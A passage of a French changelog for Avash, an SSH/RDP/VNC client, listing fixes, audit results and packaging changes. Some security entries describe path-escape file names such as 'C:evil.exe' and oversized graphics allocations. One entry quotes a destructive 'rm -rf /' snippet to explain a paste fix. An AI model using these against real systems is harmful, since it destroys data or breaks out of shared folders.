  connu, était réapprise et acceptée. La forme crochetée est désormais comprise,
  sans tronquer un IPv6 littéral.
- **Oublier une clé d'hôte ne touche plus à celle d'un autre hôte.** Quand un
  commentaire précédait les entrées de `known_hosts`, la numérotation des lignes
  se décalait (russh ne compte pas les lignes de commentaire) et « oublier »
  retirait la clé d'un hôte voisin, dont la confiance au premier contact
  repartait de zéro, en laissant la clé visée en place. Le comptage suit
  désormais exactement celui de russh.

### Corrigé

- **Une clé privée notée `~/.ssh/…` fonctionne enfin.** Le `~` d'un
  `IdentityFile` (la forme de la quasi-totalité des configurations écrites à la
  main, et l'exemple même affiché dans le champ clé) n'était jamais développé :
  le fichier de clé restait introuvable et l'hôte inconnectable, alors que `ssh`
  s'y connectait. Le tilde est développé à la connexion (hôte enregistré, saisie
  manuelle, rebond `ProxyJump`), sans être réécrit dans le fichier, qui garde
  `~/` et reste lisible par `ssh`.
- **Éditer un hôte ne perd plus ses directives.** Modifier un hôte depuis
  l'interface réécrivait tout le bloc `Host` à partir des seules directives
  qu'Avash connaît : toute autre (`ForwardAgent`, `LocalForward`,
  `IdentitiesOnly`, `Ciphers`, commentaires…) disparaissait en silence. Ces
  directives sont désormais conservées.
- **L'avertissement de clé d'hôte changée revient à travers un rebond.** Les
  échecs de connexion étaient aplatis par le `Display` d'un `anyhow::Error`, qui
  ne montre que son contexte externe : dès qu'un `ProxyJump` était en jeu, le
  contexte « Rebond hôte:port » enterrait les marqueurs que l'interface repère
  pour proposer d'oublier une clé changée ou de saisir un mot de passe. La
  chaîne d'erreur complète est désormais transmise.
- **Un `cat` d'un fichier binaire ne fige plus l'onglet.** Le décodeur UTF-8 du
  flux du terminal ne sautait qu'une séquence invalide par bloc et différait le
  reste : sur un flot d'octets invalides, sa mémoire tampon grossissait sans
  borne (coût quadratique) jusqu'à faire tomber l'onglet, et le texte suivant un
  octet invalide n'apparaissait qu'au bloc d'après. Tout le bloc est maintenant
  décodé d'un coup, les octets invalides rendus par le caractère de
  remplacement.
- **Une copie directe interrompue n'est plus annoncée réussie.** La copie d'un
  fichier d'un hôte à un autre (scp) lisait le code de sortie de la commande
  distante, mais celui-ci valait 0 par défaut : un canal fermé sans code (lien
  coupé, processus tué) passait pour un succès. L'absence de code de sortie, ou
  une interruption par signal, est désormais une erreur.
- **Une clé dont le chemin contient une espace ne casse plus toute la
  configuration.** Une valeur avec espace (`IdentityFile C:\Users\Jean
  Dupont\…`, courant sous Windows) était écrite sans guillemets ; OpenSSH lisait
  alors « extra arguments » et rejetait toute la configuration, rendant chaque
  hôte inutilisable par `ssh`. Ces valeurs sont désormais guillemetées à
  l'écriture et déguillemetées à la lecture ; une espace est refusée pour
  `HostName`, `User` et `ProxyJump`, où rien de légitime n'en contient.
- **Une clé chiffrée par phrase de passe ne bloque plus la connexion.** Le
  chargement d'une `IdentityFile` chiffrée échouait avant même que l'agent SSH
  ou le mot de passe ne soient essayés : l'onglet se fermait alors que `ssh`
  (clé dans l'agent) fonctionnait. L'échec de chargement dégrade désormais vers
  l'agent puis le mot de passe, comme le fait OpenSSH ; la raison n'apparaît que
  dans l'erreur finale, si tout échoue.
- **Une copie relais depuis une source illisible n'écrit plus un fichier vide.**
  La copie d'un hôte à l'autre lisait la taille de la source par une opération
  dont l'échec était ignoré (valeur nulle) : un lien symbolique cassé ou un
  fichier disparu créait une cible vide annoncée « copiée », et une cible
  existante était tronquée. La source est désormais lue et ouverte avant que la
  cible ne soit créée ou modifiée.

- **Redirection de lecteur RDP : plus d'évasion hors du dossier partagé.** Un
  chemin du serveur dont le dernier composant portait un préfixe de disque
  (`\C:`, `\D:`) ou un flux ADS échappait à la racine partagée sous Windows
  (`PathBuf::push` d'un préfixe sans racine repart du répertoire courant) :
  lecture, écrasement et suppression de fichiers hors du partage. Chaque
  composant est désormais validé (ni `.`, `..`, deux-points, octet nul) avec un
  contrôle de confinement en plus.
- **Réception de fichiers par le presse-papiers RDP : plus d'écriture hors du
  dossier.** Un nom annoncé « C:evil.exe » ou un composant « D: » échappait de
  la même façon au dossier de réception ; et le fichier de travail `.part`
  tronquait un fichier existant du poste (un téléchargement Firefox en cours de
  même nom). Les noms sont confinés et le fichier de travail ne peut plus
  écraser un fichier présent.
- **Canal graphique RDP : un serveur ne peut plus faire allouer 17 Gio.** Un
  `RDPGFX_RESET_GRAPHICS` annonçant une taille absurde (65535×65535) contournait
  le plafond 8192×8192 appliqué ailleurs et tuait le processus de bureau (déni
  de service pilotable par le serveur). Cette taille passe désormais par le même
  garde-fou.
- **VNC : le presse-papiers du poste ne part plus au serveur sans geste.** Le
  presse-papiers local (souvent un mot de passe fraîchement copié) était poussé
  au serveur VNC dès la connexion et à chaque focus, en clair en RFB classique.
  L'envoi suit désormais un geste de collage, comme en RDP.
- **VNC : plus de repli silencieux en clair pour un serveur connu sous TLS.** Un
  serveur déjà épinglé sous VeNCrypt pouvait retomber en RFB clair si un
  interposeur retirait le type de sécurité 19 de la liste annoncée : le client
  livrait alors sa réponse au défi puis toute la session en clair, sans consulter
  l'empreinte. La connexion est refusée avant tout envoi (modèle HSTS).
- **VNC : un type de sécurité inconnu ne fait plus échouer la connexion.** Un
  serveur annonçant, à côté d'un type connu (VncAuth), un type hors de
  l'énumération du client (partage d'écran macOS ARD, UltraVNC MS-Logon)
  faisait tout échouer, alors que le protocole veut qu'on ignore l'inconnu.
- **VNC : le bureau ne reste plus figé après une mise à jour sans pixels.** Une
  FramebufferUpdate sans rectangle (changement de résolution d'un invité
  QEMU/Xvnc) laissait le client ne plus jamais redemander d'image.
- **Bureau RDP : une connexion refusée n'entraîne plus de seconde tentative.**
  Sous la politique « Observer », un refus (mot de passe faux, délai NLA,
  certificat changé) était pris pour un serveur ne dessinant que par le canal
  graphique, déclenchant une seconde authentification avec le même mot de passe
  (double 4625 côté serveur) et une inscription parasite de l'hôte.
- **Son du bureau RDP : le bon format audio est joué.** Le format d'un bloc
  d'onde était résolu contre notre liste fixe alors que l'indice du serveur vise
  la liste envoyée par le client, dont l'ordre varie d'un lancement à l'autre.
- **Snippet « insérer sans valider » : plus rien ne s'exécute avant relecture.**
  Un snippet multi-lignes envoyait chaque saut de ligne comme une Entrée et
  exécutait toutes les commandes sauf la dernière (un `stop / rm -rf / start`
  lançait `stop` et `rm`). L'insertion passe désormais par le collage entre
  crochets, que le shell distant n'exécute qu'à la validation de l'utilisateur.
- **Mise à jour intégrée : plus de fausse proposition sur les paquets Linux.**
  Sur deb, rpm, AUR et Flathub, la vérification proposait une mise à jour puis
  échouait après avoir téléchargé l'AppImage (le manifeste ne servait que cette
  cible). Le workflow publie désormais les cibles deb et rpm signées, et
  l'application renvoie au gestionnaire de paquets là où l'installation intégrée
  est impossible.

### Vague des constats moyens (audit du 7 septembre 2026)

Soixante-treize constats de sévérité moyenne, corrigés par voie (cœur, interface,
processus RDP, front, chaîne), chacun avec le test qui l'aurait vu et un contrôle
négatif ; check.sh et la suite bout en bout au vert.

- **Robustesse du processus RDP face à un serveur hostile.** Bornage des
  allocations pilotables par le serveur, jusque-là sans plafond ou contournant
  celui existant : nombre et taille des surfaces EGFX, ResetGraphics, cache de
  surfaces (en octets, pas seulement en entrées), réassemblage du presse-papiers,
  nom du bureau VNC (ServerInit), longueur d'une correspondance ZGFX et indice de
  palette ZRLE/TRLE (portages `vendor/`). Un rectangle EGFX hors image ne fait
  plus paniquer le sidecar (bornage à l'image). Un fichier spécial (FIFO) ou un
  motif DOS récursif dans le lecteur partagé ne fige plus son fil.
- **Sécurité.** Le durcissement WebKit retire aussi `WEBKIT_INSPECTOR_HTTP_SERVER` ;
  le canal d'agent ouvert le temps d'une commande est bien refermé ; un fichier
  d'empreintes illisible n'est plus traité comme « aucun serveur connu » (fin de
  TOFU silencieuse) et sa mise à jour est atomique ; `set_readonly(false)` ne rend
  plus un fichier accessible en écriture à tous les comptes ; le presse-papiers du
  poste ne part au bureau distant (RDP et VNC) que sur un geste.
- **Justesse.** Import : une même clé `.ppk` partagée par plusieurs sessions est
  convertie une fois et rattachée à tous ; un bureau MobaXterm sans utilisateur ne
  fait plus échouer l'import ni le dupliquer. Trousseau : modifier ou supprimer un
  alias ne déplace ni n'oublie plus le secret d'un autre alias visant le même
  compte. SFTP : téléchargement et envoi ne remplacent plus un fichier existant
  sans prévenir ; une reprise ne promeut plus un `.part` tronqué. La configuration
  applique les valeurs par défaut d'un bloc `Host *` comme `ssh`, et une réécriture
  ne mange plus le commentaire du bloc suivant. La sonde de santé borne sa
  résolution DNS.
- **Interface et accessibilité.** Le panneau SFTP est pilotable au clavier
  (flèches, Entrée, Maj+F10) ; le focus est visible sur les interrupteurs
  segmentés ; le thème clair corrige les couleurs des messages de modale ; la
  bascule de langue met à jour les libellés restés figés ; la perte de focus
  relâche les touches maintenues côté distant ; le glisser-déposer d'un hôte sur
  lui-même ne le renvoie plus à la racine. Un échec de tunnel, une clé i18n
  manquante et un diagnostic RDP effacé trop tôt sont désormais montrés.
- **Chaîne d'intégration et tests.** L'échec de Vitest en CI n'est plus masqué
  (pipefail) ; le corpus de fuzz est conservé et rejoué ; le stockage web est
  remis à zéro entre fichiers E2E ; plusieurs scénarios (palette, enregistrement,
  visuel) et tests unitaires (TOFU RDP, jeton du canal local, canal d'agent
  refusé) ne peuvent plus passer à tort. La redirection d'agent tente Pageant sous
  Windows ; `puttygen` ne fait plus clignoter de fenêtre ; le manifeste Flathub
  ouvre le son et les périphériques série.

### Vague des constats bas (audit des 7-8 septembre 2026)

Cent-neuf constats de sévérité basse, corrigés par voie, chacun avec le test ou
le contrôle reproductible qui l'aurait vu ; check.sh et la suite bout en bout au
vert. Pour l'essentiel : finitions d'accessibilité et d'ergonomie, cohérence de
la documentation, hygiène des tests, petits écarts de plateforme.

- **Accessibilité et ergonomie.** Rôles et libellés ARIA de la palette et des
  interrupteurs segmentés ; vérification des mises à jour atteignable au clavier ;
  contrastes du thème clair ; messages d'erreur rendus visibles ; menus au
  clavier sans fuite d'écouteur ; diagnostic Windows qui reconnaît Pageant.
- **Cohérence de la documentation, rendue vérifiable.** Une quarantaine de
  contrôles reproductibles ajoutés (`scripts/tests/`) et branchés dans check.sh :
  compteurs de scénarios et de couverture accordés entre la feuille de route, les
  README (français et anglais, même structure), `docs/qualite.md`, `CONTRIBUTING`
  et `e2e/README` ; versions cohérentes dans tous les manifestes ; justifications
  des exceptions d'audit ; permissions Flathub ; emplacements de version au
  release. Le README anglais porte désormais la même section Documentation.
- **Hygiène des tests.** Plusieurs tests rendus discriminants ou isolés : un test
  « en parallèle » qui ne l'était pas, un `known_hosts` partagé réécrit pendant
  que d'autres tests y apprennent, un dernier utilisateur porté par serveur plutôt
  qu'en global, l'absence de fichier temporaire observée pendant le transfert et
  non après coup, un garde de lisibilité qui n'exerçait pas sa fonction.
- **Outillage.** `fuzz.sh` montre la fin du journal quand la compilation échoue ;
  le tableau des cibles du README de fuzz se rend en entier ; divers scripts de
  la chaîne durcis (sortie par identifiant, mot de passe RDP par l'entrée
  standard, détachement des conteneurs du parc).

Compteurs de tests à jour : 623 Rust, 614 dans les paquets portés, 273 front,
74 scénarios bout en bout — 1584 au total.

## [0.9.2] - 2026-09-06

- **Un fichier offert au bureau distant juste après en avoir reçu un n'échoue
  plus.** Le canal du presse-papiers met quelques PDU à revenir à l'état prêt
  après un collage ; une offre déposée dans cet intervalle était refusée
  (« clipboard channel is not in Ready state »), vu en intégration continue
  sur le scénario des fichiers RDP. L'offre attend désormais le canal, jusqu'à
  trois secondes, et l'accusé part quand elle est annoncée ; passé le délai,
  l'erreur est dite.
- **La couverture mesurée sur ce que les tests exercent vraiment.** Le relevé
  ne comptait que les tests unitaires : les commandes Tauri et la boucle du
  processus RDP, que seule la suite bout en bout traverse, valaient zéro, et
  l'espace de travail affichait 76 % pour un cœur à 91 %. `scripts/couverture.sh`
  construit l'application et le processus RDP instrumentés, joue les tests
  unitaires puis la suite dessus, et fusionne : 84 % de l'espace de travail
  (interface 48 → 70 %), 81 % du processus RDP (71 → 81 %). Les deux `main`
  réécrivent leur profil chaque seconde sous `cfg(coverage)`, parce que le
  pilote WebDriver tue l'application sans sortie propre ; ce cfg n'existe que
  sous cargo-llvm-cov. Le workflow qualité joue ce script et mesure aussi le
  front.
- **Deux trous de la suite bout en bout comblés, trouvés par la mesure.** Rien
  ne générait de clé SSH depuis la fenêtre « Mes clés SSH », et le scénario des
  tunnels ne faisait qu'en créer la définition : un tunnel est désormais
  réellement ouvert vers le sshd du harnais, le port local sert la bannière
  SSH, le trafic est compté, puis il s'arrête. Le front gagne neuf tests
  (réglages sous stockage refusé, son du bureau, politique de lecture du
  lecteur audio) : ses modules de logique pure passent de 84 à 99 %.
- **Avash est sur winget.** `winget install AdrienCros.Avash` installe la
  0.9.1 : la première soumission au dépôt communautaire de Microsoft, mise à
  jour sur place de la 0.7.2 à la 0.9.1 pendant qu'elle attendait, a été
  validée (installation réelle comprise) puis approuvée par un modérateur le
  5 septembre 2026. Les README et le site le disent, avec le badge de version
  winget.

## [0.9.1] - 2026-09-05

- **Le lecteur partagé fonctionne contre un vrai Windows 11.** Éprouvé contre
  le serveur de test et xfreerdp, il n'apparaissait jamais sur un Windows 11
  du parc : à la Server Client ID Confirm d'un serveur de version 1.13, le
  paquet `ironrdp-rdpdr` n'annonçait que les cartes à puce et, sans carte,
  n'envoyait rien, alors que Windows attend une Client Device List Announce,
  même vide, avant d'émettre la Server User Logged On qui déclenche l'annonce
  des lecteurs (mstsc et FreeRDP l'envoient toujours, MS-RDPEFS 2.2.2.9).
  Le paquet est porté dans `rdp-sidecar/vendor/ironrdp-rdpdr` avec ce seul
  changement et deux tests. Rejoué contre un Windows 11 du parc, traces du
  canal à l'appui : le serveur envoie sa Server User Logged On, puis ouvre le
  lecteur et interroge son volume. Un poste dont la session était déjà
  ouverte n'émet pas de Server User Logged On et le lecteur n'y apparaît pas
  tant qu'une ouverture de session ne survient pas, ce qui est le
  comportement de Windows, pas un défaut d'avash.
- **Le lot de provenance joint à chaque release.** L'attestation Sigstore
  vivait dans l'API de GitHub seulement ; son lot est désormais aussi un
  fichier de la release (`avash-vX.Y.Z.intoto.jsonl`), vérifiable hors ligne,
  et reconnu par le Scorecard de l'OpenSSF, qui ne voyait aucune provenance.
- **Documentation à jour de la 0.9.0** : les README et le site disent le
  lecteur partagé, le son et VeNCrypt, la section Sécurité les gardes qui
  vont avec ; `CONTRIBUTING.md` décrit la suite Windows complète ; les
  descriptions et sujets des dépôts GitHub et GitLab nomment VNC et le port
  série ; deux badges de plus, couverture et mutants, suivent le relevé du
  workflow qualité.

## [0.9.0] - 2026-09-05

- **Démarrage plus court : xterm.js chargé à part.** Deux repères de mesure
  ont montré que l'exécution des modules au démarrage (303 ms de médiane)
  tenait presque entière dans la lecture et la compilation du paquet
  (283 ms), l'évaluation (13 ms) et l'initialisation d'avash (7 ms) n'y
  étant pour rien. xterm.js et ses extensions, la moitié du paquet, sont
  désormais chargés par imports dynamiques (`web/xterm-charge.ts`), à
  l'oisiveté juste après l'accueil ou au premier terminal : le paquet
  principal passe de 666 à 172 Ko, DOMContentLoaded de 323 à 205 ms de
  médiane, le premier contenu peint de 190 à 152 ms, la latence à la frappe
  inchangée (mesures dans `docs/feuille-de-route.md`, axe 3).
- **Sous `AVASH_HOME`, les téléchargements restent sous ce toit.** Le dossier
  de réception (panneau SFTP, fichiers reçus d'un bureau RDP) était celui du
  système même quand la variable isolait le reste : sous Windows, où
  `dirs::download_dir()` l'ignore, un bac à sable de test écrivait dans le
  vrai dossier Téléchargements de l'utilisateur. Le sous-dossier des
  téléchargements du foyer est pris s'il existe, le foyer sinon ; un test
  d'intégration et un test du processus le vérifient.
- **La suite bout en bout complète tourne sous Windows.** Quatre passages
  instrumentés pour trouver que l'action « doubleClick » du protocole
  n'atteint jamais le DOM par le serveur WebDriver embarqué : toute session
  ouverte par double-clic sur un hôte restait « jamais live » sans qu'un seul
  appel n'atteigne le cœur. Les scénarios ouvrent un hôte par une aide qui
  émet l'événement à la main sur ce chemin ; de même pour la frappe dans un
  terminal, le serveur ne synthétisant que keydown et keyup quand xterm.js
  prend les caractères sur l'événement `input` de son textarea ; le chemin
  d'un enregistrement n'est plus présumé commencer par `/` ; le scénario de
  réouverture des
  onglets, qui recharge la page, se saute sur ce chemin (le rechargement
  coupe le pilotage embarqué) ; `waitForPort` attend jusqu'à quinze
  secondes, dépassé une fois en suite complète. Le job `e2e-windows` de la
  chaîne joue désormais cette suite complète à chaque poussée (sshd
  d'OpenSSH Server, serveurs RDP et VNC de test construits sur place), au
  lieu des seuls scénarios sans serveur ; le workflow d'essai qui a servi
  aux sept passages est retiré.
- **Miroir GitLab : le second double-clic sur un hôte.** Dans le scénario de
  la vue partagée, le second double-clic suivait immédiatement le premier
  « live », pendant que la barre latérale se reconstruisait (le voyant de la
  ligne) ; la référence était caduque et le double-clic tombait dans le vide
  sans erreur sous WebKitWebDriver. L'aide qui ouvre un hôte attend que la
  même ligne soit rendue deux fois de suite avant de cliquer.
- **Chaîne : références visuelles renouvelées** (la palette a trois entrées
  de plus : son, partage, diagnostic) ; le workflow qualité ne combinait plus
  `--in-place` et `--jobs`, que cargo-mutants refuse ensemble.
- **Un dossier du poste comme lecteur du bureau distant (redirection de
  lecteur, MS-RDPEFS).** La fiche d'un bureau RDP et la connexion directe
  prennent un « dossier partagé » (champ ou sélecteur du système) ; le
  processus RDP annonce alors le canal `rdpdr` avec un lecteur « Avash »,
  que le distant voit comme un disque réseau : l'explorateur y lit, écrit,
  crée, renomme et supprime, et n'importe quel programme distant y ouvre un
  fichier. Le serveur pilote tout par des requêtes d'entrée-sortie (ouvrir,
  lire, écrire, énumérer, informations de fichier et de volume, disposition,
  renommage, verrous) ; `rdp-sidecar/src/disque.rs` y répond depuis un fil
  dédié, hors de la boucle de session, par `completion_id`. Chaque chemin
  venu du serveur est ramené sous la racine partagée avant toute ouverture
  (`..` refusé, parent résolu liens compris et tenu sous la racine, lien en
  dernier composant non suivi) : un serveur hostile ne sort pas du dossier.
  Le volume se présente en NTFS distant (pas FAT32, dont l'explorateur
  refuserait les fichiers de plus de quatre gigaoctets), avec l'espace réel
  du disque du poste. MS-RDPEFS exige que `rdpdr` soit annoncé avec `rdpsnd`
  : le son coupé, un canal audio muet (aucun format, pas de drapeau ALIVE)
  reste annoncé pour que le lecteur réponde. Huit tests dans le processus
  (confinement, aller-retour créer-écrire-relire, énumération par motif
  DOS, suppression et renommage, volume, réponse par le fil, motif, dates)
  et deux dans l'interface (dossier absent refusé avant tout lancement, drapeaux du processus). Le
  serveur de test gagne son côté serveur RDPDR (`test-rdp-server/src/rdpdr/`
  : annonce 1.12, capacités, `UserLoggedOn`, puis un scénario fixe qui lit
  le volume, énumère, lit `bonjour.txt` et écrit `ecrit.txt`, une ligne par
  étape sur sa sortie), sur un ironrdp-server porté dans
  `test-rdp-server/vendor/` avec un point d'attache de canal statique que
  le paquet n'offre pas ; 27 tests (décodeurs écrits à la main, automate,
  dialogue complet avec le canal client du paquet), éprouvé aussi contre
  xfreerdp 3.31. Deux scénarios bout en bout : par le formulaire, puis le
  processus seul avec le son coupé.
- **VNC chiffré : VeNCrypt, avec le certificat épinglé.** Quand le serveur
  offre le type de sécurité VeNCrypt, le client porté le choisit, négocie la
  version 0.2 et un sous-type X.509 (`X509Vnc` d'abord, `X509None` sinon ;
  les sous-types TLS anonymes, sans certificat, sont refusés parce qu'ils ne
  prouvent pas à qui l'on parle), rend le flux au processus qui monte TLS
  (`rdp-sidecar/src/vnc_tls.rs`, le même rustls que le RDP), puis
  s'authentifie sous TLS. Le certificat n'est pas jugé par une autorité mais
  épinglé comme en RDP : clé publique mémorisée au premier contact sous
  `vnc:<hôte>:<port>` dans `rdp_known_hosts`, et un changement refuse la
  connexion avant que le mot de passe ne parte, empreintes à l'appui. Sans
  VeNCrypt, l'authentification VNC classique en clair reste ce qu'elle était
  ; le formulaire le dit. Le serveur VNC de test gagne un terminateur
  VeNCrypt (`--tls-port`, `--cert`, `--key`) qui mène la poignée de main et
  TLS puis relie le client au serveur RFB en clair ; deux scénarios bout en
  bout : la connexion chiffrée (type 19, X509Vnc, TLS, pixels, empreinte
  épinglée) et le refus d'un certificat qui change, raison affichée. Au
  passage, l'incrustation « connexion fermée » rend entière une erreur du
  processus sur plusieurs lignes : elle n'en montrait que la dernière, et un
  certificat changé se résumait à « retirez la ligne de rdp_known_hosts ».
- **Le son du bureau distant.** Le processus RDP annonce le canal `rdpsnd`
  (MS-RDPEA) avec du PCM 16 bits seulement (44,1 et 48 kHz, stéréo et mono)
  et relaie chaque bloc d'ondes à l'interface (message `[20]`, cadence et
  canaux en tête, un mégaoctet au plus par bloc), qui le joue par WebAudio
  bout à bout sur un curseur de temps, avec le volume que le serveur demande
  (`[21]`). Aucun périphérique audio ni bibliothèque native dans le
  processus : rien à embarquer dans l'AppImage, rien à réclamer au bac à
  sable Flatpak, et pas de codec à faire décoder à un serveur hostile. La
  palette coupe ou rétablit le son pour les prochaines connexions (le canal
  n'est alors pas annoncé, `--sans-son`). Trois tests dans le processus
  (formats, message, relais), trois en Vitest (en-tête, désentrelacement,
  gain), et un scénario bout en bout qui pilote le processus contre le
  serveur de test, lequel joue un la 440 Hz : PCM 44,1 kHz stéréo relayé en
  temps réel, pas du silence, et rien avec `--sans-son`.
- **Un onglet fermé laissait son conteneur.** `closeSession` demandait le
  conteneur du terminal après l'avoir disposé, quand xterm avait déjà
  détaché son élément : chaque onglet de terminal fermé laissait un
  conteneur vide dans la zone centrale. Le conteneur se retient avant.
  Vu en écrivant le scénario de la vue partagée, qui compte les conteneurs.
- **Test d'annulation d'un téléchargement rendu déterministe.** Sur
  l'exécuteur macOS de la chaîne, le transfert de 400 Kio finissait avant
  que la boucle de progression n'ait posé le drapeau d'annulation : Ok au
  lieu de « annulé ». Le fichier passe à 8 Mio (seize blocs par bande, le
  drapeau est vu), et la propriété « la reprise ne relit pas les bandes que
  la carte dit faites » a son propre test, sur une carte posée à la main.
- **Publication : un seul motif pour les signatures.** Le workflow Release
  listait `*.app.tar.gz.sig` en plus de `*.sig` : la signature macOS partait
  deux fois, et la seconde copie, en écrasement, tombait sur un fichier que la
  première venait de remplacer (« Not Found »). La 0.8.0 est restée en
  brouillon sans cette signature, terminée à la main (signature reprise de
  l'artefact du même run, empreintes, manifeste et attestations vérifiés,
  puis publication). Le motif en double est retiré.
- **Port série.** « Connexion directe » gagne un mode Série : le port (ceux
  du poste sont proposés, un chemin se tape aussi) et la vitesse, 8 bits sans
  parité ni contrôle de flux, le réglage des consoles de commutateurs, de
  routeurs et de cartes. La session vit dans un onglet de terminal comme une
  session SSH (mêmes canaux, même pump, enregistrement asciicast compris),
  sans SFTP ni sonde d'OS. Deux fils bloquants lisent et écrivent le port
  (`serialport`, sans libudev) ; fermer l'onglet ferme le port. Testé sur un
  pseudo-terminal (`openpty`) dans le cœur, et de bout en bout sur un
  pseudo-terminal tenu par `socat` qui renvoie ce qu'il reçoit ; le chemin
  doit ressembler à un port (`/dev/…`, `COMn`), pas à un fichier quelconque.
- **Vue partagée.** `Ctrl+Maj+E` (le raccourci de Terminator, ou la palette) met l'onglet actif et le
  suivant côte à côte, chacun dans son volet ; un terminal SSH et un bureau
  RDP ou VNC se partagent l'écran de la même façon. L'onglet actif est celui
  des deux qui a le clavier ; cliquer un onglet qui n'est dans aucun volet le
  met à la place de l'actif ; fermer l'un des deux referme le partage. Les
  terminaux se réajustent à leur volet, et un bureau distant affiché dans un
  volet se redimensionne à sa taille (le processus n'envoie d'images qu'aux
  bureaux visibles, comme avant). Ce que la zone centrale montre passe
  maintenant par un seul endroit (`web/vue-partagee.ts`) au lieu de quatre
  boucles qui se recopiaient. Scénario bout en bout sur deux sessions SSH.
- **Les onglets de la dernière fois se rouvrent.** À chaque ouverture ou
  fermeture d'onglet, la liste de ce qui est ouvert (alias SSH, bureaux RDP
  et VNC enregistrés ; jamais une connexion directe, qui n'a ni configuration
  ni mot de passe rejouable) est écrite dans le répertoire de configuration
  (`onglets.json`, 32 entrées au plus). Au lancement suivant, l'accueil dit
  « La dernière fois, N onglets étaient ouverts » et propose de les rouvrir,
  dans l'ordre ; « Ignorer » efface la mémoire. Proposé, jamais imposé : un
  onglet SSH rouvert peut demander un mot de passe. Un hôte supprimé depuis
  n'est pas compté. Écrit à chaque changement plutôt qu'à la fermeture,
  parce que WebKitGTK ne laisse pas toujours le temps d'un `beforeunload`.
  Deux tests Rust (aller-retour, fichier cassé et liste trop longue), deux
  tests Vitest (ce qui est retenu, ce qui est proposé) et un scénario bout en
  bout qui recharge le front sur le sshd local.
- **« Exporter un diagnostic… »** dans la palette : l'utilisateur choisit un
  fichier, le cœur y écrit (en 0600, d'un seul tenant) ce qu'un ticket a
  besoin de savoir : version, moteur web, système et session graphique,
  emballage (AppImage, Flatpak…), chemin du processus de bureau distant,
  réponse du trousseau et de l'agent SSH, variables d'environnement suivies,
  la configuration en nombre (hôtes, dossiers, rebonds, clés ; bureaux RDP et
  VNC ; tunnels) et les dernières lignes du processus de chaque session de
  bureau distant ouverte. Jamais un mot de passe ni un nom d'hôte de
  `~/.ssh/config` ; l'en-tête rappelle que les journaux peuvent citer
  l'adresse d'un serveur. Le trousseau est sondé sur une entrée qui n'existe
  pas : « mot de passe redemandé à chaque fois » vient presque toujours d'un
  trousseau absent, que l'application masque à dessein le reste du temps.
  Quatre tests (texte, collecte sans recopier les hôtes, écriture 0600 et
  refus d'un chemin relatif) et un scénario bout en bout sur la commande.

## [0.8.0] - 2026-09-04

- **Paquets `.deb` et `.rpm`, et nomenclature logicielle.** Chaque release
  porte, à côté de l'AppImage, un paquet Debian (Debian 12, Ubuntu 22.04 et
  suivants) et un paquet RPM (Fedora, openSUSE) qui s'installent par le
  gestionnaire de paquets et dépendent du WebKitGTK et du GTK du système ;
  tous deux ont été installés et lancés dans des conteneurs Ubuntu et Fedora
  avant d'être annoncés. Un SBOM au format SPDX 2.3 (les bibliothèques
  exactes de l'espace de travail, du processus RDP et du front, sans les
  arbres de test) est joint et attesté par Sigstore, lié aux binaires. Le
  README ne parle plus de « binaires reproductibles » : la construction ne
  l'est pas (SECURITY.md le disait déjà), elle est attestée.
- **Un site.** La vitrine d'Avash est sur https://adrienavalon.github.io/avash/
  (et `/en/`) : ce que fait l'application, pourquoi elle est sûre, comment
  elle est éprouvée, et les fichiers de la dernière version par système,
  lus sur l'API GitHub avec des liens statiques en repli. Une page HTML par
  langue, une feuille de style, aucun service tiers ; publiée par le
  workflow `pages.yml` à chaque changement de `site/` ou des captures.
- **Dépendances.** La suite bout en bout n'embarque plus `extract-zip`
  (GHSA-jmr9-qjv8-65gv, traversée de chemin par lien symbolique, sans
  version corrigée) : `@puppeteer/browsers` est forcé en version 3, qui
  l'a remplacé par `modern-tar` ; WebdriverIO ne s'en sert que pour
  installer un pilote de navigateur, ce que la suite ne fait jamais.
  L'avis RUSTSEC-2024-0429 sur `glib` 0.18, imposé par la pile GTK 3 de
  Tauri et déjà justifié dans `deny.toml`, est clos côté Dependabot avec la
  même raison.
- **Flathub.** Le manifeste `packaging/flathub/io.github.AdrienAvalon.avash.yml`
  construit Avash hors ligne dans le bac à sable de flatpak-builder (runtime
  GNOME 49, Rust stable et Node 22 du SDK, sources cargo et npm figées par
  `scripts/flathub-sources.sh`), avec les droits que le métier impose et
  pas plus : réseau, agent SSH, trousseau, dossier personnel. Construit,
  installé et lancé sur le poste avant d'être soumis ; l'identifiant suit le
  dépôt GitHub, l'application gardant `dev.avash.app` pour GTK et D-Bus.
- **Le panneau SFTP transfère des dossiers entiers, reprend, envoie en
  bandes, empile et copie d'un hôte à l'autre.** Télécharger ou déposer un
  dossier le transfère avec son arborescence (sous-dossiers vides compris),
  fichier par fichier. Un transfert annulé (bouton sur sa ligne) ou coupé
  garde ce qui est fait : une carte de reprise à côté du `.part` (ou du
  fichier local, pour un envoi) note les bandes complètes, et relancer le
  même transfert ne redemande que le reste, si le fichier n'a pas changé
  entre-temps (taille et date) ; un envoi reprend au dernier point de contrôle
  vidé (tous les 4 Mio). L'envoi en bandes parallèles a été écrit, mesuré
  contre un `internal-sftp` d'OpenSSH, et **refusé** : la bibliothèque
  pipeline déjà huit écritures, et huit descripteurs en parallèle étaient
  quatre fois plus lents en réseau local pour 1,2 × à 40 ms d'aller-retour
  (les chiffres sont dans la feuille de route). Un serveur qui nomme une
  entrée « ../x » ou « a/b » dans un dossier parcouru est refusé : rien ne
  s'écrit hors du dossier de réception ni hors du dossier cible d'un relais
  (relevé par la revue de sécurité du commit, avec le test qui le joue). Les transferts vont dans une file, trois à
  la fois, chacun avec sa ligne, sa progression, sa vitesse et son bouton
  d'annulation. « Copier vers un autre hôte… » dans le menu d'un fichier ou
  d'un dossier le copie vers un autre onglet SSH : par défaut les octets
  traversent le poste sans y être écrits (relais par bandes, un descripteur
  de lecture ici, un d'écriture là-bas) ; en cochant « copie directe »,
  l'hôte source envoie lui-même par `scp`, avec l'agent SSH du poste prêté
  le temps de la commande et refusé à tout autre moment. Le serveur SFTP de
  test gagne un système de fichiers en mémoire ; six tests d'intégration
  jouent le dossier récursif dans les deux sens, la reprise après annulation
  (les bandes faites ne sont pas relues, le fichier repris est identique), le
  relais entre deux serveurs et l'annulation ; le scénario bout en bout
  télécharge un dossier et copie un fichier d'un onglet à l'autre contre le
  vrai sshd.
- **Des fichiers par le presse-papiers RDP, dans les deux sens.** Quand le
  bureau distant copie des fichiers, Avash n'en demande que la liste (noms,
  tailles) et la montre dans une pastille sous le bureau ; un clic, une
  confirmation qui dit combien, quelle taille et où, et les fichiers
  arrivent dans le dossier des téléchargements, par morceaux d'un mégaoctet,
